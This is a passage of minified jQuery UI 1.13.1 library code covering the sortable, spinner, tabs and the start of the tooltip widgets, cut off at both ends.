this.containers[c].containerCache.over&&(this.containers[c]._trigger("out",b,this._uiHash(this)),this.containers[c].containerCache.over=0)}if(f){if(1===this.containers.length)this.containers[a].containerCache.over||(this.containers[a]._trigger("over",b,this._uiHash(this)),this.containers[a].containerCache.over=1);else{for(i=1e4,e=null,l=(k=f.floating||this._isFloating(this.currentItem))?"left":"top",m=k?"width":"height",h=k?"pageX":"pageY",d=this.items.length-1;d>=0;d--)$.contains(this.containers[a].element[0],this.items[d].item[0])&&this.items[d].item[0]!==this.currentItem[0]&&(g=this.items[d].item.offset()[l],j=!1,b[h]-g>this.items[d][m]/2&&(j=!0),Math.abs(b[h]-g)<i&&(i=Math.abs(b[h]-g),e=this.items[d],this.direction=j?"up":"down"));if(!e&&!this.options.dropOnEmpty)return;if(this.currentContainer===this.containers[a]){this.currentContainer.containerCache.over||(this.containers[a]._trigger("over",b,this._uiHash()),this.currentContainer.containerCache.over=1);return}e?this._rearrange(b,e,null,!0):this._rearrange(b,null,this.containers[a].element,!0),this._trigger("change",b,this._uiHash()),this.containers[a]._trigger("change",b,this._uiHash(this)),this.currentContainer=this.containers[a],this.options.placeholder.update(this.currentContainer,this.placeholder),this.scrollParent=this.placeholder.scrollParent(),this.scrollParent[0]!==this.document[0]&&"HTML"!==this.scrollParent[0].tagName&&(this.overflowOffset=this.scrollParent.offset()),this.containers[a]._trigger("over",b,this._uiHash(this)),this.containers[a].containerCache.over=1}}},_createHelper:function(c){var b=this.options,a="function"==typeof b.helper?$(b.helper.apply(this.element[0],[c,this.currentItem])):"clone"===b.helper?this.currentItem.clone():this.currentItem;return a.parents("body").length||this.appendTo[0].appendChild(a[0]),a[0]===this.currentItem[0]&&(this._storedCSS={width:this.currentItem[0].style.width,height:this.currentItem[0].style.height,position:this.currentItem.css("position"),top:this.currentItem.css("top"),left:this.currentItem.css("left")}),(!a[0].style.width||b.forceHelperSize)&&a.width(this.currentItem.width()),(!a[0].style.height||b.forceHelperSize)&&a.height(this.currentItem.height()),a},_adjustOffsetFromHelper:function(a){"string"==typeof a&&(a=a.split(" ")),Array.isArray(a)&&(a={left:+a[0],top:+a[1]||0}),"left"in a&&(this.offset.click.left=a.left+this.margins.left),"right"in a&&(this.offset.click.left=this.helperProportions.width-a.right+this.margins.left),"top"in a&&(this.offset.click.top=a.top+this.margins.top),"bottom"in a&&(this.offset.click.top=this.helperProportions.height-a.bottom+this.margins.top)},_getParentOffset:function(){this.offsetParent=this.helper.offsetParent();var a=this.offsetParent.offset();return"absolute"===this.cssPosition&&this.scrollParent[0]!==this.document[0]&&$.contains(this.scrollParent[0],this.offsetParent[0])&&(a.left+=this.scrollParent.scrollLeft(),a.top+=this.scrollParent.scrollTop()),(this.offsetParent[0]===this.document[0].body||this.offsetParent[0].tagName&&"html"===this.offsetParent[0].tagName.toLowerCase()&&$.ui.ie)&&(a={top:0,left:0}),{top:a.top+(parseInt(this.offsetParent.css("borderTopWidth"),10)||0),left:a.left+(parseInt(this.offsetParent.css("borderLeftWidth"),10)||0)}},_getRelativeOffset:function(){if("relative"!==this.cssPosition)return{top:0,left:0};var a=this.currentItem.position();return{top:a.top-(parseInt(this.helper.css("top"),10)||0)+this.scrollParent.scrollTop(),left:a.left-(parseInt(this.helper.css("left"),10)||0)+this.scrollParent.scrollLeft()}},_cacheMargins:function(){this.margins={left:parseInt(this.currentItem.css("marginLeft"),10)||0,top:parseInt(this.currentItem.css("marginTop"),10)||0}},_cacheHelperProportions:function(){this.helperProportions={width:this.helper.outerWidth(),height:this.helper.outerHeight()}},_setContainment:function(){var a,c,d,b=this.options;"parent"===b.containment&&(b.containment=this.helper[0].parentNode),("document"===b.containment||"window"===b.containment)&&(this.containment=[0-this.offset.relative.left-this.offset.parent.left,0-this.offset.relative.top-this.offset.parent.top,"document"===b.containment?this.document.width():this.window.width()-this.helperProportions.width-this.margins.left,("document"===b.containment?this.document.height()||document.body.parentNode.scrollHeight:this.window.height()||this.document[0].body.parentNode.scrollHeight)-this.helperProportions.height-this.margins.top]),/^(document|window|parent)$/.test(b.containment)||(a=$(b.containment)[0],c=$(b.containment).offset(),d="hidden"!==$(a).css("overflow"),this.containment=[c.left+(parseInt($(a).css("borderLeftWidth"),10)||0)+(parseInt($(a).css("paddingLeft"),10)||0)-this.margins.left,c.top+(parseInt($(a).css("borderTopWidth"),10)||0)+(parseInt($(a).css("paddingTop"),10)||0)-this.margins.top,c.left+(d?Math.max(a.scrollWidth,a.offsetWidth):a.offsetWidth)-(parseInt($(a).css("borderLeftWidth"),10)||0)-(parseInt($(a).css("paddingRight"),10)||0)-this.helperProportions.width-this.margins.left,c.top+(d?Math.max(a.scrollHeight,a.offsetHeight):a.offsetHeight)-(parseInt($(a).css("borderTopWidth"),10)||0)-(parseInt($(a).css("paddingBottom"),10)||0)-this.helperProportions.height-this.margins.top])},_convertPositionTo:function(e,b){b||(b=this.position);var a="absolute"===e?1:-1,c="absolute"!==this.cssPosition||this.scrollParent[0]!==this.document[0]&&$.contains(this.scrollParent[0],this.offsetParent[0])?this.scrollParent:this.offsetParent,d=/(html|body)/i.test(c[0].tagName);return{top:b.top+this.offset.relative.top*a+this.offset.parent.top*a-("fixed"===this.cssPosition?-this.scrollParent.scrollTop():d?0:c.scrollTop())*a,left:b.left+this.offset.relative.left*a+this.offset.parent.left*a-("fixed"===this.cssPosition?-this.scrollParent.scrollLeft():d?0:c.scrollLeft())*a}},_generatePosition:function(d){var b,c,a=this.options,e=d.pageX,f=d.pageY,g="absolute"!==this.cssPosition||this.scrollParent[0]!==this.document[0]&&$.contains(this.scrollParent[0],this.offsetParent[0])?this.scrollParent:this.offsetParent,h=/(html|body)/i.test(g[0].tagName);return"relative"!==this.cssPosition||this.scrollParent[0]!==this.document[0]&&this.scrollParent[0]!==this.offsetParent[0]||(this.offset.relative=this._getRelativeOffset()),this.originalPosition&&(this.containment&&(d.pageX-this.offset.click.left<this.containment[0]&&(e=this.containment[0]+this.offset.click.left),d.pageY-this.offset.click.top<this.containment[1]&&(f=this.containment[1]+this.offset.click.top),d.pageX-this.offset.click.left>this.containment[2]&&(e=this.containment[2]+this.offset.click.left),d.pageY-this.offset.click.top>this.containment[3]&&(f=this.containment[3]+this.offset.click.top)),a.grid&&(b=this.originalPageY+Math.round((f-this.originalPageY)/a.grid[1])*a.grid[1],f=this.containment?b-this.offset.click.top>=this.containment[1]&&b-this.offset.click.top<=this.containment[3]?b:b-this.offset.click.top>=this.containment[1]?b-a.grid[1]:b+a.grid[1]:b,c=this.originalPageX+Math.round((e-this.originalPageX)/a.grid[0])*a.grid[0],e=this.containment?c-this.offset.click.left>=this.containment[0]&&c-this.offset.click.left<=this.containment[2]?c:c-this.offset.click.left>=this.containment[0]?c-a.grid[0]:c+a.grid[0]:c)),{top:f-this.offset.click.top-this.offset.relative.top-this.offset.parent.top+("fixed"===this.cssPosition?-this.scrollParent.scrollTop():h?0:g.scrollTop()),left:e-this.offset.click.left-this.offset.relative.left-this.offset.parent.left+("fixed"===this.cssPosition?-this.scrollParent.scrollLeft():h?0:g.scrollLeft())}},_rearrange:function(c,a,b,d){b?b[0].appendChild(this.placeholder[0]):a.item[0].parentNode.insertBefore(this.placeholder[0],"down"===this.direction?a.item[0]:a.item[0].nextSibling),this.counter=this.counter?++this.counter:1;var e=this.counter;this._delay(function(){e===this.counter&&this.refreshPositions(!d)})},_clear:function(d,c){this.reverting=!1;var a,b=[];if(!this._noFinalSort&&this.currentItem.parent().length&&this.placeholder.before(this.currentItem),this._noFinalSort=null,this.helper[0]===this.currentItem[0]){for(a in this._storedCSS)("auto"===this._storedCSS[a]||"static"===this._storedCSS[a])&&(this._storedCSS[a]="");this.currentItem.css(this._storedCSS),this._removeClass(this.currentItem,"ui-sortable-helper")}else this.currentItem.show();function e(a,b,c){return function(d){c._trigger(a,d,b._uiHash(b))}}for(this.fromOutside&&!c&&b.push(function(a){this._trigger("receive",a,this._uiHash(this.fromOutside))}),(this.fromOutside||this.domPosition.prev!==this.currentItem.prev().not(".ui-sortable-helper")[0]||this.domPosition.parent!==this.currentItem.parent()[0])&&!c&&b.push(function(a){this._trigger("update",a,this._uiHash())}),this===this.currentContainer||c||(b.push(function(a){this._trigger("remove",a,this._uiHash())}),b.push((function(a){return function(b){a._trigger("receive",b,this._uiHash(this))}}).call(this,this.currentContainer)),b.push((function(a){return function(b){a._trigger("update",b,this._uiHash(this))}}).call(this,this.currentContainer))),a=this.containers.length-1;a>=0;a--)c||b.push(e("deactivate",this,this.containers[a])),this.containers[a].containerCache.over&&(b.push(e("out",this,this.containers[a])),this.containers[a].containerCache.over=0);if(this.storedCursor&&(this.document.find("body").css("cursor",this.storedCursor),this.storedStylesheet.remove()),this._storedOpacity&&this.helper.css("opacity",this._storedOpacity),this._storedZIndex&&this.helper.css("zIndex","auto"===this._storedZIndex?"":this._storedZIndex),this.dragging=!1,c||this._trigger("beforeStop",d,this._uiHash()),this.placeholder[0].parentNode.removeChild(this.placeholder[0]),this.cancelHelperRemoval||(this.helper[0]!==this.currentItem[0]&&this.helper.remove(),this.helper=null),!c){for(a=0;a<b.length;a++)b[a].call(this,d);this._trigger("stop",d,this._uiHash())}return this.fromOutside=!1,!this.cancelHelperRemoval},_trigger:function(){!1===$.Widget.prototype._trigger.apply(this,arguments)&&this.cancel()},_uiHash:function(b){var a=b||this;return{helper:a.helper,placeholder:a.placeholder||$([]),position:a.position,originalPosition:a.originalPosition,offset:a.positionAbs,item:a.currentItem,sender:b?b.element:null}}}),$.widget("ui.spinner",{version:"1.13.1",defaultElement:"<input>",widgetEventPrefix:"spin",options:{classes:{"ui-spinner":"ui-corner-all","ui-spinner-down":"ui-corner-br","ui-spinner-up":"ui-corner-tr"},culture:null,icons:{down:"ui-icon-triangle-1-s",up:"ui-icon-triangle-1-n"},incremental:!0,max:null,min:null,numberFormat:null,page:10,step:1,change:null,spin:null,start:null,stop:null},_create:function(){this._setOption("max",this.options.max),this._setOption("min",this.options.min),this._setOption("step",this.options.step),""!==this.value()&&this._value(this.element.val(),!0),this._draw(),this._on(this._events),this._refresh(),this._on(this.window,{beforeunload:function(){this.element.removeAttr("autocomplete")}})},_getCreateOptions:function(){var a=this._super(),b=this.element;return $.each(["min","max","step"],function(e,d){var c=b.attr(d);null!=c&&c.length&&(a[d]=c)}),a},_events:{keydown:function(a){this._start(a)&&this._keydown(a)&&a.preventDefault()},keyup:"_stop",focus:function(){this.previous=this.element.val()},blur:function(a){if(this.cancelBlur){delete this.cancelBlur;return}this._stop(),this._refresh(),this.previous!==this.element.val()&&this._trigger("change",a)},mousewheel:function(a,b){var c=$.ui.safeActiveElement(this.document[0]);if(this.element[0]===c&&b){if(!this.spinning&&!this._start(a))return!1;this._spin((b>0?1:-1)*this.options.step,a),clearTimeout(this.mousewheelTimer),this.mousewheelTimer=this._delay(function(){this.spinning&&this._stop(a)},100),a.preventDefault()}},"mousedown .ui-spinner-button":function(a){var b;function c(){this.element[0]!==$.ui.safeActiveElement(this.document[0])&&(this.element.trigger("focus"),this.previous=b,this._delay(function(){this.previous=b}))}b=this.element[0]===$.ui.safeActiveElement(this.document[0])?this.previous:this.element.val(),a.preventDefault(),c.call(this),this.cancelBlur=!0,this._delay(function(){delete this.cancelBlur,c.call(this)}),!1!==this._start(a)&&this._repeat(null,$(a.currentTarget).hasClass("ui-spinner-up")?1:-1,a)},"mouseup .ui-spinner-button":"_stop","mouseenter .ui-spinner-button":function(a){if($(a.currentTarget).hasClass("ui-state-active")){if(!1===this._start(a))return!1;this._repeat(null,$(a.currentTarget).hasClass("ui-spinner-up")?1:-1,a)}},"mouseleave .ui-spinner-button":"_stop"},_enhance:function(){this.uiSpinner=this.element.attr("autocomplete","off").wrap("<span>").parent().append("<a></a><a></a>")},_draw:function(){this._enhance(),this._addClass(this.uiSpinner,"ui-spinner","ui-widget ui-widget-content"),this._addClass("ui-spinner-input"),this.element.attr("role","spinbutton"),this.buttons=this.uiSpinner.children("a").attr("tabIndex",-1).attr("aria-hidden",!0).button({classes:{"ui-button":""}}),this._removeClass(this.buttons,"ui-corner-all"),this._addClass(this.buttons.first(),"ui-spinner-button ui-spinner-up"),this._addClass(this.buttons.last(),"ui-spinner-button ui-spinner-down"),this.buttons.first().button({icon:this.options.icons.up,showLabel:!1}),this.buttons.last().button({icon:this.options.icons.down,showLabel:!1}),this.buttons.height()>Math.ceil(.5*this.uiSpinner.height())&&this.uiSpinner.height()>0&&this.uiSpinner.height(this.uiSpinner.height())},_keydown:function(a){var c=this.options,b=$.ui.keyCode;switch(a.keyCode){case b.UP:return this._repeat(null,1,a),!0;case b.DOWN:return this._repeat(null,-1,a),!0;case b.PAGE_UP:return this._repeat(null,c.page,a),!0;case b.PAGE_DOWN:return this._repeat(null,-c.page,a),!0}return!1},_start:function(a){return(!!this.spinning|| !1!==this._trigger("start",a))&&(this.counter||(this.counter=1),this.spinning=!0,!0)},_repeat:function(a,b,c){a=a||500,clearTimeout(this.timer),this.timer=this._delay(function(){this._repeat(40,b,c)},a),this._spin(b*this.options.step,c)},_spin:function(b,c){var a=this.value()||0;this.counter||(this.counter=1),a=this._adjustValue(a+b*this._increment(this.counter)),(!this.spinning|| !1!==this._trigger("spin",c,{value:a}))&&(this._value(a),this.counter++)},_increment:function(a){var b=this.options.incremental;return b?"function"==typeof b?b(a):Math.floor(a*a*a/5e4-a*a/500+17*a/200+1):1},_precision:function(){var a=this._precisionOf(this.options.step);return null!==this.options.min&&(a=Math.max(a,this._precisionOf(this.options.min))),a},_precisionOf:function(c){var a=c.toString(),b=a.indexOf(".");return -1===b?0:a.length-b-1},_adjustValue:function(b){var d,c,a=this.options;return(c=Math.round((c=b-(d=null!==a.min?a.min:0))/a.step)*a.step,b=d+c,b=parseFloat(b.toFixed(this._precision())),null!==a.max&&b>a.max)?a.max:null!==a.min&&b<a.min?a.min:b},_stop:function(a){this.spinning&&(clearTimeout(this.timer),clearTimeout(this.mousewheelTimer),this.counter=0,this.spinning=!1,this._trigger("stop",a))},_setOption:function(a,b){var e,c,d;if("culture"===a||"numberFormat"===a){e=this._parse(this.element.val()),this.options[a]=b,this.element.val(this._format(e));return}("max"===a||"min"===a||"step"===a)&&"string"==typeof b&&(b=this._parse(b)),"icons"===a&&(c=this.buttons.first().find(".ui-icon"),this._removeClass(c,null,this.options.icons.up),this._addClass(c,null,b.up),d=this.buttons.last().find(".ui-icon"),this._removeClass(d,null,this.options.icons.down),this._addClass(d,null,b.down)),this._super(a,b)},_setOptionDisabled:function(a){this._super(a),this._toggleClass(this.uiSpinner,null,"ui-state-disabled",!!a),this.element.prop("disabled",!!a),this.buttons.button(a?"disable":"enable")},_setOptions:c(function(a){this._super(a)}),_parse:function(a){return"string"==typeof a&&""!==a&&(a=window.Globalize&&this.options.numberFormat?Globalize.parseFloat(a,10,this.options.culture):+a),""===a||isNaN(a)?null:a},_format:function(a){return""===a?"":window.Globalize&&this.options.numberFormat?Globalize.format(a,this.options.numberFormat,this.options.culture):a},_refresh:function(){this.element.attr({"aria-valuemin":this.options.min,"aria-valuemax":this.options.max,"aria-valuenow":this._parse(this.element.val())})},isValid:function(){var a=this.value();return null!==a&&a===this._adjustValue(a)},_value:function(a,c){var b;""!==a&&null!==(b=this._parse(a))&&(c||(b=this._adjustValue(b)),a=this._format(b)),this.element.val(a),this._refresh()},_destroy:function(){this.element.prop("disabled",!1).removeAttr("autocomplete role aria-valuemin aria-valuemax aria-valuenow"),this.uiSpinner.replaceWith(this.element)},stepUp:c(function(a){this._stepUp(a)}),_stepUp:function(a){this._start()&&(this._spin((a||1)*this.options.step),this._stop())},stepDown:c(function(a){this._stepDown(a)}),_stepDown:function(a){this._start()&&(this._spin(-((a||1)*this.options.step)),this._stop())},pageUp:c(function(a){this._stepUp((a||1)*this.options.page)}),pageDown:c(function(a){this._stepDown((a||1)*this.options.page)}),value:function(a){if(!arguments.length)return this._parse(this.element.val());c(this._value).call(this,a)},widget:function(){return this.uiSpinner}}),!1!==$.uiBackCompat&&$.widget("ui.spinner",$.ui.spinner,{_enhance:function(){this.uiSpinner=this.element.attr("autocomplete","off").wrap(this._uiSpinnerHtml()).parent().append(this._buttonHtml())},_uiSpinnerHtml:function(){return"<span>"},_buttonHtml:function(){return"<a></a><a></a>"}}),$.ui.spinner,/*!
 * jQuery UI Tabs 1.13.1
 * http://jqueryui.com
 *
 * Copyright jQuery Foundation and other contributors
 * Released under the MIT license.
 * http://jquery.org/license
 */ $.widget("ui.tabs",{version:"1.13.1",delay:300,options:{active:null,classes:{"ui-tabs":"ui-corner-all","ui-tabs-nav":"ui-corner-all","ui-tabs-panel":"ui-corner-bottom","ui-tabs-tab":"ui-corner-top"},collapsible:!1,event:"click",heightStyle:"content",hide:null,show:null,activate:null,beforeActivate:null,beforeLoad:null,load:null},_isLocal:(o=/#.*$/,function(c){var a,b;a=c.href.replace(o,""),b=location.href.replace(o,"");try{a=decodeURIComponent(a)}catch(d){}try{b=decodeURIComponent(b)}catch(e){}return c.hash.length>1&&a===b}),_create:function(){var b=this,a=this.options;this.running=!1,this._addClass("ui-tabs","ui-widget ui-widget-content"),this._toggleClass("ui-tabs-collapsible",null,a.collapsible),this._processTabs(),a.active=this._initialActive(),Array.isArray(a.disabled)&&(a.disabled=$.uniqueSort(a.disabled.concat($.map(this.tabs.filter(".ui-state-disabled"),function(a){return b.tabs.index(a)}))).sort()),!1!==this.options.active&&this.anchors.length?this.active=this._findActive(a.active):this.active=$(),this._refresh(),this.active.length&&this.load(a.active)},_initialActive:function(){var a=this.options.active,b=this.options.collapsible,c=location.hash.substring(1);return null===a&&(c&&this.tabs.each(function(b,d){if($(d).attr("aria-controls")===c)return a=b,!1}),null===a&&(a=this.tabs.index(this.tabs.filter(".ui-tabs-active"))),(null===a|| -1===a)&&(a=!!this.tabs.length&&0)),!1!==a&& -1===(a=this.tabs.index(this.tabs.eq(a)))&&(a=!b&&0),!b&& !1===a&&this.anchors.length&&(a=0),a},_getCreateEventData:function(){return{tab:this.active,panel:this.active.length?this._getPanelForTab(this.active):$()}},_tabKeydown:function(b){var c=$($.ui.safeActiveElement(this.document[0])).closest("li"),a=this.tabs.index(c),d=!0;if(!this._handlePageNav(b)){switch(b.keyCode){case $.ui.keyCode.RIGHT:case $.ui.keyCode.DOWN:a++;break;case $.ui.keyCode.UP:case $.ui.keyCode.LEFT:d=!1,a--;break;case $.ui.keyCode.END:a=this.anchors.length-1;break;case $.ui.keyCode.HOME:a=0;break;case $.ui.keyCode.SPACE:b.preventDefault(),clearTimeout(this.activating),this._activate(a);return;case $.ui.keyCode.ENTER:b.preventDefault(),clearTimeout(this.activating),this._activate(a!==this.options.active&&a);return;default:return}b.preventDefault(),clearTimeout(this.activating),a=this._focusNextTab(a,d),b.ctrlKey||b.metaKey||(c.attr("aria-selected","false"),this.tabs.eq(a).attr("aria-selected","true"),this.activating=this._delay(function(){this.option("active",a)},this.delay))}},_panelKeydown:function(a){!this._handlePageNav(a)&&a.ctrlKey&&a.keyCode===$.ui.keyCode.UP&&(a.preventDefault(),this.active.trigger("focus"))},_handlePageNav:function(a){return a.altKey&&a.keyCode===$.ui.keyCode.PAGE_UP?(this._activate(this._focusNextTab(this.options.active-1,!1)),!0):a.altKey&&a.keyCode===$.ui.keyCode.PAGE_DOWN?(this._activate(this._focusNextTab(this.options.active+1,!0)),!0):void 0},_findNextTab:function(a,b){var d=this.tabs.length-1;function c(){return a>d&&(a=0),a<0&&(a=d),a}for(;-1!==$.inArray(c(),this.options.disabled);)a=b?a+1:a-1;return a},_focusNextTab:function(a,b){return a=this._findNextTab(a,b),this.tabs.eq(a).trigger("focus"),a},_setOption:function(b,a){if("active"===b){this._activate(a);return}this._super(b,a),"collapsible"!==b||(this._toggleClass("ui-tabs-collapsible",null,a),a|| !1!==this.options.active||this._activate(0)),"event"===b&&this._setupEvents(a),"heightStyle"===b&&this._setupHeightStyle(a)},_sanitizeSelector:function(a){return a?a.replace(/[!"$%&'()*+,.\/:;<=>?@\[\]\^`{|}~]/g,"\\$&"):""},refresh:function(){var a=this.options,b=this.tablist.children(":has(a[href])");a.disabled=$.map(b.filter(".ui-state-disabled"),function(a){return b.index(a)}),this._processTabs(),!1!==a.active&&this.anchors.length?this.active.length&&!$.contains(this.tablist[0],this.active[0])?this.tabs.length===a.disabled.length?(a.active=!1,this.active=$()):this._activate(this._findNextTab(Math.max(0,a.active-1),!1)):a.active=this.tabs.index(this.active):(a.active=!1,this.active=$()),this._refresh()},_refresh:function(){this._setOptionDisabled(this.options.disabled),this._setupEvents(this.options.event),this._setupHeightStyle(this.options.heightStyle),this.tabs.not(this.active).attr({"aria-selected":"false","aria-expanded":"false",tabIndex:-1}),this.panels.not(this._getPanelForTab(this.active)).hide().attr({"aria-hidden":"true"}),this.active.length?(this.active.attr({"aria-selected":"true","aria-expanded":"true",tabIndex:0}),this._addClass(this.active,"ui-tabs-active","ui-state-active"),this._getPanelForTab(this.active).show().attr({"aria-hidden":"false"})):this.tabs.eq(0).attr("tabIndex",0)},_processTabs:function(){var d=this,a=this.tabs,b=this.anchors,c=this.panels;this.tablist=this._getList().attr("role","tablist"),this._addClass(this.tablist,"ui-tabs-nav","ui-helper-reset ui-helper-clearfix ui-widget-header"),this.tablist.on("mousedown"+this.eventNamespace,"> li",function(a){$(this).is(".ui-state-disabled")&&a.preventDefault()}).on("focus"+this.eventNamespace,".ui-tabs-anchor",function(){$(this).closest("li").is(".ui-state-disabled")&&this.blur()}),this.tabs=this.tablist.find("> li:has(a[href])").attr({role:"tab",tabIndex:-1}),this._addClass(this.tabs,"ui-tabs-tab","ui-state-default"),this.anchors=this.tabs.map(function(){return $("a",this)[0]}).attr({tabIndex:-1}),this._addClass(this.anchors,"ui-tabs-anchor"),this.panels=$(),this.anchors.each(function(i,b){var c,a,e,g=$(b).uniqueId().attr("id"),f=$(b).closest("li"),h=f.attr("aria-controls");d._isLocal(b)?(e=(c=b.hash).substring(1),a=d.element.find(d._sanitizeSelector(c))):(c="#"+(e=f.attr("aria-controls")||$({}).uniqueId()[0].id),(a=d.element.find(c)).length||(a=d._createPanel(e)).insertAfter(d.panels[i-1]||d.tablist),a.attr("aria-live","polite")),a.length&&(d.panels=d.panels.add(a)),h&&f.data("ui-tabs-aria-controls",h),f.attr({"aria-controls":e,"aria-labelledby":g}),a.attr("aria-labelledby",g)}),this.panels.attr("role","tabpanel"),this._addClass(this.panels,"ui-tabs-panel","ui-widget-content"),a&&(this._off(a.not(this.tabs)),this._off(b.not(this.anchors)),this._off(c.not(this.panels)))},_getList:function(){return this.tablist||this.element.find("ol, ul").eq(0)},_createPanel:function(a){return $("<div>").attr("id",a).data("ui-tabs-destroy",!0)},_setOptionDisabled:function(a){var b,d,c;for(Array.isArray(a)&&(a.length?a.length===this.anchors.length&&(a=!0):a=!1),c=0;d=this.tabs[c];c++)b=$(d),!0===a|| -1!==$.inArray(c,a)?(b.attr("aria-disabled","true"),this._addClass(b,null,"ui-state-disabled")):(b.removeAttr("aria-disabled"),this._removeClass(b,null,"ui-state-disabled"));this.options.disabled=a,this._toggleClass(this.widget(),this.widgetFullName+"-disabled",null,!0===a)},_setupEvents:function(a){var b={};a&&$.each(a.split(" "),function(c,a){b[a]="_eventHandler"}),this._off(this.anchors.add(this.tabs).add(this.panels)),this._on(!0,this.anchors,{click:function(a){a.preventDefault()}}),this._on(this.anchors,b),this._on(this.tabs,{keydown:"_tabKeydown"}),this._on(this.panels,{keydown:"_panelKeydown"}),this._focusable(this.tabs),this._hoverable(this.tabs)},_setupHeightStyle:function(b){var a,c=this.element.parent();"fill"===b?(a=c.height(),a-=this.element.outerHeight()-this.element.height(),this.element.siblings(":visible").each(function(){var b=$(this),c=b.css("position");"absolute"!==c&&"fixed"!==c&&(a-=b.outerHeight(!0))}),this.element.children().not(this.panels).each(function(){a-=$(this).outerHeight(!0)}),this.panels.each(function(){$(this).height(Math.max(0,a-$(this).innerHeight()+$(this).height()))}).css("overflow","auto")):"auto"===b&&(a=0,this.panels.each(function(){a=Math.max(a,$(this).height("").height())}).height(a))},_eventHandler:function(b){var d=this.options,c=this.active,a=$(b.currentTarget).closest("li"),e=a[0]===c[0],f=e&&d.collapsible,g=f?$():this._getPanelForTab(a),h=c.length?this._getPanelForTab(c):$(),i={oldTab:c,oldPanel:h,newTab:f?$():a,newPanel:g};b.preventDefault(),a.hasClass("ui-state-disabled")||a.hasClass("ui-tabs-loading")||this.running||e&&!d.collapsible|| !1===this._trigger("beforeActivate",b,i)||(d.active=!f&&this.tabs.index(a),this.active=e?$():a,this.xhr&&this.xhr.abort(),h.length||g.length||$.error("jQuery UI Tabs: Mismatching fragment identifier."),g.length&&this.load(this.tabs.index(a),b),this._toggle(b,i))},_toggle:function(e,a){var f=this,c=a.newPanel,b=a.oldPanel;function g(){f.running=!1,f._trigger("activate",e,a)}function d(){f._addClass(a.newTab.closest("li"),"ui-tabs-active","ui-state-active"),c.length&&f.options.show?f._show(c,f.options.show,g):(c.show(),g())}this.running=!0,b.length&&this.options.hide?this._hide(b,this.options.hide,function(){f._removeClass(a.oldTab.closest("li"),"ui-tabs-active","ui-state-active"),d()}):(this._removeClass(a.oldTab.closest("li"),"ui-tabs-active","ui-state-active"),b.hide(),d()),b.attr("aria-hidden","true"),a.oldTab.attr({"aria-selected":"false","aria-expanded":"false"}),c.length&&b.length?a.oldTab.attr("tabIndex",-1):c.length&&this.tabs.filter(function(){return 0===$(this).attr("tabIndex")}).attr("tabIndex",-1),c.attr("aria-hidden","false"),a.newTab.attr({"aria-selected":"true","aria-expanded":"true",tabIndex:0})},_activate:function(c){var b,a=this._findActive(c);a[0]!==this.active[0]&&(a.length||(a=this.active),b=a.find(".ui-tabs-anchor")[0],this._eventHandler({target:b,currentTarget:b,preventDefault:$.noop}))},_findActive:function(a){return!1===a?$():this.tabs.eq(a)},_getIndex:function(a){return"string"==typeof a&&(a=this.anchors.index(this.anchors.filter("[href$='"+$.escapeSelector(a)+"']"))),a},_destroy:function(){this.xhr&&this.xhr.abort(),this.tablist.removeAttr("role").off(this.eventNamespace),this.anchors.removeAttr("role tabIndex").removeUniqueId(),this.tabs.add(this.panels).each(function(){$.data(this,"ui-tabs-destroy")?$(this).remove():$(this).removeAttr("role tabIndex aria-live aria-busy aria-selected aria-labelledby aria-hidden aria-expanded")}),this.tabs.each(function(){var a=$(this),b=a.data("ui-tabs-aria-controls");b?a.attr("aria-controls",b).removeData("ui-tabs-aria-controls"):a.removeAttr("aria-controls")}),this.panels.show(),"content"!==this.options.heightStyle&&this.panels.css("height","")},enable:function(b){var a=this.options.disabled;!1!==a&&(void 0===b?a=!1:(b=this._getIndex(b),a=Array.isArray(a)?$.map(a,function(a){return a!==b?a:null}):$.map(this.tabs,function(c,a){return a!==b?a:null})),this._setOptionDisabled(a))},disable:function(b){var a=this.options.disabled;if(!0!==a){if(void 0===b)a=!0;else{if(b=this._getIndex(b),-1!==$.inArray(b,a))return;a=Array.isArray(a)?$.merge([b],a).sort():[b]}this._setOptionDisabled(a)}},load:function(b,e){b=this._getIndex(b);var g=this,a=this.tabs.eq(b),c=a.find(".ui-tabs-anchor"),d=this._getPanelForTab(a),f={tab:a,panel:d},h=function(b,c){"abort"===c&&g.panels.stop(!1,!0),g._removeClass(a,"ui-tabs-loading"),d.removeAttr("aria-busy"),b===g.xhr&&delete g.xhr};!this._isLocal(c[0])&&(this.xhr=$.ajax(this._ajaxSettings(c,e,f)),this.xhr&&"canceled"!==this.xhr.statusText&&(this._addClass(a,"ui-tabs-loading"),d.attr("aria-busy","true"),this.xhr.done(function(a,b,c){setTimeout(function(){d.html(a),g._trigger("load",e,f),h(c,b)},1)}).fail(function(a,b){setTimeout(function(){h(a,b)},1)})))},_ajaxSettings:function(a,b,c){var d=this;return{url:a.attr("href").replace(/#.*$/,""),beforeSend:function(a,e){return d._trigger("beforeLoad",b,$.extend({jqXHR:a,ajaxSettings:e},c))}}},_getPanelForTab:function(a){var b=$(a).attr("aria-controls");return this.element.find(this._sanitizeSelector("#"+b))}}),!1!==$.uiBackCompat&&$.widget("ui.tabs",$.ui.tabs,{_processTabs:function(){this._superApply(arguments),this._addClass(this.tabs,"ui-tab")}}),$.ui.tabs,/*!
 * jQuery UI Tooltip 1.13.1
 * http://jqueryui.com
 *
 * Copyright jQuery Foundation and other contributors
 * Released under the MIT license.
 * http://jquery.org/license
 */ $.widget("ui.tooltip",{version:"1.13.1",options:{classes:{"ui-tooltip":"ui-corner-all ui-widget-shadow"},content:function(){var a=$(this).attr("title");return $("<a>").text(a).html()},hide:!0,items:"[title]:not([disabled])",position:{my:"left top+15",at:"left bottom",collision:"flipfit flip"},show:!0,track:!1,close:null,open:null},_addDescribedBy:function(a,b){var c=(a.attr("aria-describedby")||"").split(/\s+/);c.push(b),a.data("ui-tooltip-id",b).attr("aria-describedby",String.prototype.trim.call(c.join(" ")))},_removeDescribedBy:function(a){var d=a.data("ui-tooltip-id"),b=(a.attr("aria-describedby")||"").split(/\s+/),c=$.inArray(d,b);-1!==c&&b.splice(c,1),a.removeData("ui-tooltip-id"),(b=String.prototype.trim.call(b.join(" ")))?a.attr("aria-describedby",b):a.removeAttr("aria-describedby")},_create:function(){this._on({mouseover:"open",focusin:"open"}),this.tooltips={},this.parents={},this.liveRegion=$("<div>").attr({role:"log","aria-live":"assertive","aria-relevant":"additions"}).appendTo(this.document[0].body),this._addClass(this.liveRegion,null,"ui-helper-hidden-accessible"),this.disabledTitles=$([])},_setOption:function(a,b){var c=this;this._super(a,b),"content"===a&&$.each(this.tooltips,function(b,a){c._updateContent(a.element)})},_setOptionDisabled:function(a){this[a?"_disable":"_enable"]()},_disable:function(){var 